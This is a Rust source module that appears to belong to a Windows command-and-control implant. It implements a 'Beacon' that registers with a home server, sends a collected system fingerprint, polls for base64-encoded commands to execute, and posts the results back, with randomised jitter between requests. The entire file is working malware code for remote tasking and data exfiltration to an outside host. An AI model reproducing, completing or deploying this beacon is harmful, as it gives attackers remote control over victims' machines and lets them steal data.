pub mod client;
use client::*;
use log::{debug, info};
use std::{
    net::SocketAddrV4,
    time::{Duration, SystemTime, UNIX_EPOCH},
};
use windows::core::HSTRING;

use base64::prelude::*;

use crate::collector;

const BASE_JITTER_SECS: u64 = 5;
const JITTER_RATE: f64 = 0.5;

pub enum Task {
    Exec(Vec<u8>),
    Sleep(std::time::Duration),
    Kill,
}

pub struct Beacon {
    id: u32,
    client: Client,
    home: SocketAddrV4,
    base_jitter: Duration,
    rate: f64,
}

impl Beacon {
    pub fn new(home: SocketAddrV4) -> windows::core::Result<Self> {
        let client = Client::new()?;
        let id = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap()
            .subsec_nanos();

        Ok(Self {
            client,
            id,
            home,
            base_jitter: Duration::from_secs(BASE_JITTER_SECS),
            rate: JITTER_RATE,
        })
    }

    /// /api/v1/hello POST
    pub fn initial_request(&mut self) -> windows::core::Result<Response> {
        self.sleep_with_jitter();

        info!(
            "sending initial request to {}:{}",
            self.home.ip(),
            self.home.port()
        );
        let id_bytes = self.id.to_le_bytes();

        let headers = [HSTRING::from("Content-Type: application/octet-stream")];

        let header_block = build_winhttp_headers(&headers);

        let hostname_win = HSTRING::from(self.home.ip().to_string());

        let req = Request {
            hostname: hostname_win,
            port: self.home.port(),
            method: HSTRING::from("POST"),
            path: HSTRING::from("/api/v1/hello"),
            headers: Some(&header_block),
            body: Some(&id_bytes),
        };

        let resp = self.client.request(req)?;

        Ok(resp)
    }

    /// /api/v1/sysinfo POST
    pub fn send_system_info(&mut self) -> windows::core::Result<Response> {
        self.sleep_with_jitter();

        info!("collecting system info...");
        let sys_info = collector::SystemFingerprint::collect()?;

        let bytes =
            postcard::to_allocvec(&sys_info).map_err(|_| windows::core::Error::from_win32())?;

        debug!("sending {} bytes of fingerprint", bytes.len());

        let headers = [HSTRING::from("Content-Type: application/octet-stream")];

        let header_block = build_winhttp_headers(&headers);

        let hostname_win = HSTRING::from(self.home.ip().to_string());

        let req = Request {
            hostname: hostname_win,
            port: self.home.port(),
            method: HSTRING::from("POST"),
            path: HSTRING::from("/api/v1/sysinfo"),
            headers: Some(&header_block),
            body: Some(&bytes),
        };

        let resp = self.client.request(req)?;
        log::trace!(
            "client.request() method returned successfully, response status_code: {}",
            resp.status_code
        );

        log::trace!("exiting send_system_info() method...");
        Ok(resp)
    }

    /// /api/v1/task GET
    pub fn get_task(&mut self) -> windows::core::Result<Task> {
        self.sleep_with_jitter();

        info!("checking if task is available...");

        let hostname_win = HSTRING::from(self.home.ip().to_string());

        let req = Request {
            hostname: hostname_win,
            port: self.home.port(),
            method: HSTRING::from("GET"),
            path: HSTRING::from("/api/v1/task"),
            headers: None,
            body: None,
        };

        let resp = self.client.request(req)?;

        let colon_index = resp
            .body
            .iter()
            .position(|&b| b == b':')
            .expect("bad task response format");

        let (task_name_bytes, payload_bytes) = resp.body.split_at(colon_index);

        // skip the colon
        let payload_bytes = &payload_bytes[1..];

        let task_name = String::from_utf8_lossy(task_name_bytes)
            .trim()
            .to_lowercase();
        let payload_str = String::from_utf8_lossy(payload_bytes);

        // decode base64 payload if present
        let task = match task_name.as_str() {
            // exec:[base64 encoded command]
            "exec" => {
                let decoded = BASE64_STANDARD
                    .decode(payload_str.as_bytes())
                    .map_err(|_| windows::core::Error::from_win32())?;
                Task::Exec(decoded)
            }
            // sleep:[duration in seconds]
            "sleep" => {
                let seconds: u64 = payload_str
                    .parse()
                    .map_err(|_| windows::core::Error::from_win32())?;
                Task::Sleep(Duration::from_secs(seconds))
            }
            // kill:[idk yet]
            // payload shouldn't even exist for kill but whatever i'll deal with it later
            "kill" => Task::Kill,
            other => {
                debug!("unknown task: {}", other);
                return Err(windows::core::Error::from_win32());
            }
        };

        Ok(task)
    }

    /// /api/v1/result POST
    pub fn send_exec_result(&mut self, result: Vec<u8>) -> windows::core::Result<Response> {
        self.sleep_with_jitter();

        info!("sending command execution result...");

        let headers = [HSTRING::from("Content-Type: application/octet-stream")];

        let header_block = build_winhttp_headers(&headers);

        let hostname_win = HSTRING::from(self.home.ip().to_string());

        let req = Request {
            hostname: hostname_win,
            port: self.home.port(),
            method: HSTRING::from("POST"),
            path: HSTRING::from("/api/v1/result"),
            headers: Some(&header_block),
            body: Some(&result),
        };

        let resp = self.client.request(req)?;

        Ok(resp)
    }

    fn sleep_with_jitter(&self) {
        let base_ms = self.base_jitter.as_millis() as i64;
        if base_ms == 0 {
            return;
        }

        let rate = self.rate.clamp(0.0, 1.0);

        let jitter_ms = (base_ms as f64 * rate) as i64;
        if jitter_ms == 0 {
            info!(
                "sleeping for approximately {} secs",
                self.base_jitter.as_secs()
            );
            std::thread::sleep(self.base_jitter);
            return;
        }

        let nanos = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap()
            .subsec_nanos() as i64;

        let offset = (nanos % (2 * jitter_ms + 1)) - jitter_ms;
        let result_ms = (base_ms + offset).max(0);

        info!(
            "sleeping for approximately {} secs",
            Duration::from_millis(result_ms as u64).as_secs()
        );
        std::thread::sleep(Duration::from_millis(result_ms as u64));
    }
}

fn build_winhttp_headers(headers: &[HSTRING]) -> Vec<u16> {
    let mut buf: Vec<u16> = Vec::new();

    for header in headers {
        buf.extend(header.as_wide());
    }

    buf.push(0);
    buf
}
